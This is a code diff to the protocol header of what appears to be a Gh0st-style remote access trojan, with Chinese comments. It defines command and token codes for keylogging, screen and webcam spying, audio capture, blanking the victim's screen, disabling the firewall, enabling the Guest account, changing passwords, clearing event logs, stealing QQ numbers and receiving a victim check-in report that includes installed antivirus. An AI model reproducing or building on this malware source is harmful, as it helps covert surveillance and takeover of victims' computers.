@@ -2,6 +2,7 @@
 #define AFX_MACROS_H_INCLUDED
 
 #include <winsock2.h>
+
 //////////////////////////////////////////////////////////////////////////
 enum {
     // 文件传输方式
@@ -14,6 +15,7 @@ enum {
     TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
     TRANSFER_MODE_CANCEL,			// 取消传送
 };
+
 enum {
     COMMAND_LIST_FILES = 1,			// 列出目录中的文件
     COMMAND_DOWN_FILES,				// 下载文件
@@ -33,7 +35,6 @@ enum {
     COMMAND_MOVE_DIRECTORY,         // 移动文件夹
     COMMAND_MOVE_FILE,              // 移动文件
 
-
     TOKEN_FILE_LIST,				// 文件列表
     TOKEN_FILE_SIZE,				// 文件大小，传输文件时用
     TOKEN_FILE_DATA,				// 文件数据
@@ -49,10 +50,11 @@ enum {
     TOKEN_MOVE_FINISH,
     TOKEN_COMPRESS_FINISH,
 };
+
 //////////////////////////////////////////////////////////////////////////
 //////////////////////////////////////////////////////////////////////////
 enum {
-    COMMAND_SCREEN_RESET = 1,			// 改变屏幕深度
+    COMMAND_SCREEN_RESET = 1,		// 改变屏幕深度
     COMMAND_ALGORITHM_RESET,		// 改变算法
     COMMAND_SCREEN_CTRL_ALT_DEL,	// 发送Ctrl+Alt+Del
     COMMAND_SCREEN_CONTROL,			// 屏幕控制
@@ -63,12 +65,10 @@ enum {
     COMMAND_SCREEN_GET_CLIPBOARD,	// 获取远程剪贴版
     COMMAND_SCREEN_SET_CLIPBOARD,	// 设置远程剪帖版
 
-
     TOKEN_FIRSTSCREEN,				// 屏幕查看的第一张图
     TOKEN_NEXTSCREEN,				// 屏幕查看的下一张图
     TOKEN_CLIPBOARD_TEXT,			// 屏幕查看时发送剪帖版内容
 };
-
 
 //////////////////////////////////////////////////////////////////////////
 //////////////////////////////////////////////////////////////////////////
@@ -105,7 +105,6 @@ enum {
 
     COMMAND_S_SESSION,              // 会话管理
 
-    //
     TOKEN_WSLIST,					// 窗口列表
     TOKEN_SSLIST,                   // 系统信息
     TOKEN_USLIST,                   // 系统用户
@@ -118,10 +117,9 @@ enum {
     TOKEN_CHANGE_PSAA_SUCCESS,      // 更改用户密码成功
     TOKEN_GET_TERMSRV,              // XP系统获取双开3389文件
     TOKEN_TERMSRV_OK,               // 双开3389成功
-    TOKEN_RUNIST,                    ///注册表
+    TOKEN_RUNIST,                   ///注册表
     TOKEN_SYSIST,
     TOKEN_MACIST,
-
 };
 
 //////////////////////////////////////////////////////////////////////////
@@ -130,6 +128,7 @@ enum {
     COMMAND_WEBCAM_RESIZE = 1,    		// 摄像头调整分辩率，后面跟两个INT型的宽高
     TOKEN_WEBCAM_DIB,			    	// 摄像头的图像数据
 };
+
 //////////////////////////////////////////////////////////////////////////
 //////////////////////////////////////////////////////////////////////////
 enum {
@@ -139,6 +138,7 @@ enum {
     COMMAND_PAUSESERVERICE,              // 暂停服务
     COMMAND_CONTINUESERVERICE,           // 继续服务
 };
+
 //////////////////////////////////////////////////////////////////////////
 //////////////////////////////////////////////////////////////////////////
 enum {
@@ -153,6 +153,7 @@ enum {
     TOKEN_REG_ERROR,                  // 注册表出错
     TOKEN_REG_KEY,                    // 键值数据
 };
+
 //////////////////////////////////////////////////////////////////////////
 //////////////////////////////////////////////////////////////////////////
 enum {
@@ -163,6 +164,7 @@ enum {
     TOKEN_AUDIO_DATA,               // 音频数据
     TOKEN_AUDIO_CHANGE_FINISH,      // 换道成功
 };
+
 //////////////////////////////////////////////////////////////////////////
 //////////////////////////////////////////////////////////////////////////
 enum {
@@ -172,6 +174,7 @@ enum {
     COMMAND_EXCEPTION,				// 传输发生异常，需要重新传输
     TOKEN_KEYBOARD_DATA,			// 键盘记录的数据
 };
+
 //////////////////////////////////////////////////////////////////////////
 //////////////////////////////////////////////////////////////////////////
 enum {
@@ -180,6 +183,7 @@ enum {
     CLEAN_EVENT_SEC,
     CLEAN_EVENT_APP
 };
+
 //////////////////////////////////////////////////////////////////////////
 //////////////////////////////////////////////////////////////////////////
 enum {
@@ -192,6 +196,7 @@ enum {
     TOKEN_PROXY_DATA,
     TOKEN_PROXY_BIND_RESULT
 };
+
 //////////////////////////////////////////////////////////////////////////
 enum {
     // 控制端发出的命令
@@ -220,8 +225,6 @@ enum {
     COMMAND_PRANK,                  // 恶 作 剧
 
     // 主要功能
-    COMMAND_NEXT1,					// 下一步(控制端已经打开对话框)
-
     COMMAND_NEXT = 100,				// 下一步(控制端已经打开对话框)
     COMMAND_LIST_DRIVE,	            // 文件管理(列出磁盘目录)
     COMMAND_SCREEN_SPY,				// 屏幕监控
@@ -245,7 +248,7 @@ enum {
     COMMAND_PLUGINME,
     COMMAND_SHOW_QQ,
     COMMAND_QQBOX,
-    ///////////
+
     COMMAND_SYSINFO,                //服务器信息
     COMMAND_SEND_SYSINFO,			//获取服务器信息
     COMMAND_SEND_INSTALLINFO,		//获取安装信息
@@ -253,7 +256,7 @@ enum {
     COMMAND_GUEST,                  //启用GUEST
     COMMAND_STOPFIRE,               //关闭防火墙
     COMMAND_CHANGE_PORT,            //更改终端端口
-    COMMAND_OPEN_PROXYx,				//代理
+    COMMAND_OPEN_PROXYx,			//代理
     COMMAND_CLOSE_3389,				//关闭3389
     COMMAND_OPEN_3389x,				//开启3389
     COMMAND_DLL_3389,				//可以传输3389dll
@@ -266,24 +269,10 @@ enum {
     COMMAND_WTS_Logoff,			    //注销用户
     COMMAND_WTS_Disconnect,			//断开用户
 
-    COMMAND_SCREEN_SPY1,				// 屏幕查看
-    COMMAND_AERO_DISABLE1,			// 禁用桌面合成(Aero)
-    COMMAND_AERO_ENABLE1,			// 启用桌面合成(Aero)
-    COMMAND_SCREEN_RESET1,			// 改变屏幕深度
-    COMMAND_ALGORITHM_RESET1,		// 改变算法
-    COMMAND_SCREEN_CTRL_ALT_DEL1,	// 发送Ctrl+Alt+Del
-    COMMAND_SCREEN_CONTROL1,			// 屏幕控制
-    COMMAND_SCREEN_BLOCK_INPUT1,		// 锁定服务端键盘鼠标输入
-    COMMAND_SCREEN_BLANK1,			// 服务端黑屏
-    COMMAND_SCREEN_CAPTURE_LAYER1,	// 捕捉层
-    COMMAND_SCREEN_GET_CLIPBOARD1,	// 获取远程剪贴版
-    COMMAND_SCREEN_SET_CLIPBOARD1,	// 设置远程剪帖版
-
-    TOKEN_BITMAPINFO1,				// 屏幕查看的BITMAPINFO
-    TOKEN_FIRSTSCREEN1,				// 屏幕查看的第一张图
-    TOKEN_NEXTSCREEN1,				// 屏幕查看的下一张图
-    TOKEN_CLIPBOARD_TEXT1,			// 屏幕查看时发送剪帖版内容
-/////////////////////////////////////////////////////////////////////////////////////////
+	/////////////////////////////////////////////////////////////////////////////////////////
+    COMMAND_AERO_DISABLE,			// 禁用桌面合成(Aero)
+    COMMAND_AERO_ENABLE,			// 启用桌面合成(Aero)
+    /////////////////////////////////////////////////////////////////////////////////////////
 
     // 服务端发出的标识
     TOKEN_LOGIN = 200,				// 上线包
@@ -305,8 +294,6 @@ enum {
     TOKEN_CHAT_START,
     TOKEN_GETQQNUM,
 
-    ////
-
     TOKEN_SYSINFOLIST,              // 信息列表
     TOKEN_INSTALLINFOLIST,			// 安装信息列表
     TOKEN_ADD_SUCCESS,				// 添加成功
@@ -323,11 +310,8 @@ enum {
 
     // 预留
 
-
     TOKEN_SHOWQQ,
     TOKEN_RECV_QQ,
-
-
 };
 
 struct DLLSERVER_INFO {
@@ -359,6 +343,7 @@ struct DLLSERVER_INFO {
 
     BOOL    bisUnInstall;
 };
+
 typedef struct __SERVER_DLL_DATA_ {
     char szFindFlags[20];
     DWORD dwDllDataSize;
@@ -366,13 +351,14 @@ typedef struct __SERVER_DLL_DATA_ {
     BYTE pDllData[1024 * 280];			// 此数据大小必须大于DLL文件大小
 
 } SERVER_DLL_DATA, *LPSERVER_DLL_DATA;
+
 //信息列表结构体
 //信息列表结构体
 struct tagSystemInfo1 {
     char szSystem[128];     //操作系统
-    char szCpuInfo[128];   //CPU信息
+    char szCpuInfo[128];    //CPU信息
     char szActiveTime[128]; //活动时间
-    char szAntiVirus[128]; //杀毒软件
+    char szAntiVirus[128];  //杀毒软件
     char szUserName[128];   //用户名
     char szRemotePort[128]; //远程端口
     DWORD szMemory;         //内存大小
@@ -382,15 +368,14 @@ struct tagSystemInfo1 {
     char szOpenInfo[128];	// 是否双开(是否开启)
 };
 
-
 typedef struct {
     BYTE			bToken;			// = 1
     char			UpGroup[32];	// 上线分组
-    IN_ADDR	    	IPAddress;	// 存储32位的IPv4的地址数据结构
+    IN_ADDR	    	IPAddress;	    // 存储32位的IPv4的地址数据结构
     char			HostName[50];	// 主机名
     OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
     char			CPUClockMhz[20];// CPU信息
-    float				CPUClockMhz1;	// CPU主频
+    float			CPUClockMhz1;	// CPU主频
     int				CPUNumber;	    // CPU个数
     DWORD			dwSpeed;		// 网速
     UINT			bIsWebCam;		// 是否有摄像头
